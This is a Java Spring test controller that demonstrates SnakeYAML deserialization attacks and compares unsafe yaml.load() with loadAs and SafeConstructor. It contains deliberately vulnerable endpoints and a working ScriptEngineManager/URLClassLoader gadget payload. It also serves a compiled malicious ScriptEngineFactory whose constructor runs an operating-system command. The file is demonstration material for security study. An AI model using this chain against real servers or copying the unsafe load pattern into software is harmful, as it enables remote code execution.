package cn.moonlord.test;

import io.swagger.annotations.Api;
import io.swagger.annotations.ApiImplicitParam;
import io.swagger.annotations.ApiImplicitParams;
import io.swagger.annotations.ApiOperation;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;
import org.yaml.snakeyaml.Yaml;
import org.yaml.snakeyaml.constructor.Constructor;
import org.yaml.snakeyaml.constructor.SafeConstructor;
import springfox.documentation.annotations.ApiIgnore;

import javax.servlet.http.HttpServletRequest;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.Serializable;

@Api(tags = "YAML 测试")
@RestController
@RequestMapping("/YAML")
public class YAMLTestController {

    private static final Logger logger = LoggerFactory.getLogger(YAMLTestController.class);

    public static class SimpleObject implements Serializable {
        private String name;
        public SimpleObject(){
            System.out.println("SimpleObject 构造方法被调用！");
        }
        public String getName() {
            System.out.println("SimpleObject.getName 方法被调用！");
            return name;
        }
        public void setName(String name) {
            System.out.println("SimpleObject.setName 方法被调用！");
            this.name = name;
        }
    }

    private static final String AttackScriptEngineFactory =
        "import java.util.*;\n" +
        "import javax.script.*;\n" +
        "public class AttackScriptEngineFactory implements ScriptEngineFactory {\n" +
        "public AttackScriptEngineFactory() throws Exception {\n" +
        "  System.out.println(\"AttackScriptEngineFactory 构造方法被调用！\");\n" +
        "  Runtime.getRuntime().exec(\"mspaint.exe\");\n" +
        "}\n" +
        "@Override public String getEngineName() { return null; }\n" +
        "@Override public String getEngineVersion() { return null; }\n" +
        "@Override public List<String> getExtensions() { return null; }\n" +
        "@Override public List<String> getMimeTypes() { return null; }\n" +
        "@Override public List<String> getNames() { return null; }\n" +
        "@Override public String getLanguageName() { return null; }\n" +
        "@Override public String getLanguageVersion() { return null; }\n" +
        "@Override public Object getParameter(String key) { return null; }\n" +
        "@Override public String getMethodCallSyntax(String obj, String m, String... args) { return null; }\n" +
        "@Override public String getOutputStatement(String toDisplay) { return null; }\n" +
        "@Override public String getProgram(String... statements) { return null; }\n" +
        "@Override public ScriptEngine getScriptEngine() { return null; }\n" +
        "}\n";

    @ApiIgnore
    @GetMapping(value = "AttackScriptEngineFactory.class")
    public byte[] AttackScriptEngineFactory() throws Exception {
        String javaFile = "target/AttackScriptEngineFactory.java";
        FileOutputStream out = new FileOutputStream(new File(javaFile));
        out.write(AttackScriptEngineFactory.getBytes());
        out.close();
        Runtime.getRuntime().exec(new String[] { "javac", "-encoding", "UTF-8", javaFile });
        String classFile ="target/AttackScriptEngineFactory.class";
        Thread.sleep(1000);
        FileInputStream in = new FileInputStream(new File(classFile));
        byte[] buffer = new byte[in.available()];
        in.read(buffer);
        in.close();
        logger.info("AttackScriptEngineFactory return size : " + buffer.length);
        return buffer;
    }

    private static final String testCaseA1 = "Hello World";
    private static final String testCaseA2 = "!!cn.moonlord.test.YAMLTestController$SimpleObject {name: Hello World}";
    private static final String testCaseA3 = "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://localhost:8080/YAML/callback\"]]]]";
    private static final String testCaseA4 = "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://localhost:8080/YAML/\"]]]]";

    @ApiIgnore
    @GetMapping(value = "/callback")
    public String callback(HttpServletRequest request) {
        String output = "callback URL: " + request.getRequestURL();
        if(request.getQueryString() != null){
            output += "?" + request.getQueryString();
        }
        logger.info(output);
        return output;
    }

    @ApiIgnore
    @GetMapping(value = "/META-INF/services/javax.script.ScriptEngineFactory")
    public String metaInf(HttpServletRequest request) {
        String output = "metaInf URL: " + request.getRequestURL();
        if(request.getQueryString() != null){
            output += "?" + request.getQueryString();
        }
        logger.info(output);
        return "AttackScriptEngineFactory";
    }

    @ApiOperation(value="测试用例 A1，将对象转换为 YAML 字符串")
    @ApiImplicitParams({@ApiImplicitParam(name = "name", value = "name", example = testCaseA1)})
    @GetMapping(value = "/TestA1")
    public String TestA1(@RequestParam String name) {
        SimpleObject simpleObject = new SimpleObject();
        simpleObject.setName(name);
        Yaml yaml = new Yaml();
        String yamlString = yaml.dump(simpleObject);
        System.out.println("simpleObject : " + yamlString);
        return yamlString;
    }

    @ApiOperation(value="测试用例 A2，将 YAML 字符串转换为对象")
    @ApiImplicitParams({@ApiImplicitParam(name = "YAMLString", value = "YAML 字符串", example = testCaseA2)})
    @GetMapping(value = "/TestA2")
    public String TestA2(@RequestParam String YAMLString) {
        Yaml yaml = new Yaml();
        SimpleObject simpleObject = yaml.load(YAMLString);
        System.out.println("simpleObject : " + simpleObject);
        return simpleObject.toString();
    }

    @ApiOperation(value="测试用例 B1，使用 load 转换对象时，构造 URL - URLClassLoader - ScriptEngineManager，可以发送请求")
    @ApiImplicitParams({@ApiImplicitParam(name = "YAMLString", value = "YAML 字符串", example = testCaseA3)})
    @GetMapping(value = "/TestB1")
    public String TestB1(@RequestParam String YAMLString) {
        Yaml yaml = new Yaml();
        SimpleObject simpleObject = yaml.load(YAMLString);
        System.out.println("simpleObject : " + simpleObject);
        return simpleObject.toString();
    }

    @ApiOperation(value="测试用例 B2，使用 loadAs 转换对象时，构造 URL - URLClassLoader - ScriptEngineManager，类型不匹配会先报错，不会发送请求")
    @ApiImplicitParams({@ApiImplicitParam(name = "YAMLString", value = "YAML 字符串", example = testCaseA3)})
    @GetMapping(value = "/TestB2")
    public String TestB2(@RequestParam String YAMLString) {
        Yaml yaml = new Yaml();
        SimpleObject simpleObject = yaml.loadAs(YAMLString, SimpleObject.class);
        System.out.println("simpleObject : " + simpleObject);
        return simpleObject.toString();
    }

    @ApiOperation(value="测试用例 B3，使用 Constructor 构造的 load 转换对象时，构造 URL - URLClassLoader - ScriptEngineManager，类型不匹配会先报错，不会发送请求")
    @ApiImplicitParams({@ApiImplicitParam(name = "YAMLString", value = "YAML 字符串", example = testCaseA3)})
    @GetMapping(value = "/TestB3")
    public String TestB3(@RequestParam String YAMLString) {
        Yaml yaml = new Yaml(new Constructor(SimpleObject.class));
        SimpleObject simpleObject = yaml.load(YAMLString);
        System.out.println("simpleObject : " + simpleObject);
        return simpleObject.toString();
    }

    @ApiOperation(value="测试用例 C1，使用 load 转换对象时，通过指定恶意的 ScriptEngineFactory，可以执行任意代码")
    @ApiImplicitParams({@ApiImplicitParam(name = "YAMLString", value = "YAML 字符串", example = testCaseA4)})
    @GetMapping(value = "/TestC1")
    public String TestC1(@RequestParam String YAMLString) {
        Yaml yaml = new Yaml();
        SimpleObject simpleObject = yaml.load(YAMLString);
        System.out.println("simpleObject : " + simpleObject);
        return simpleObject.toString();
    }

    @ApiOperation(value="测试用例 C2，使用 SafeConstructor 构造的 load 转换对象时，类型不匹配会先报错，不能执行任意代码")
    @ApiImplicitParams({@ApiImplicitParam(name = "YAMLString", value = "YAML 字符串", example = testCaseA4)})
    @GetMapping(value = "/TestC2")
    public String TestC2(@RequestParam String YAMLString) {
        Yaml yaml = new Yaml(new SafeConstructor());
        SimpleObject simpleObject = yaml.load(YAMLString);
        System.out.println("simpleObject : " + simpleObject);
        return simpleObject.toString();
    }

}
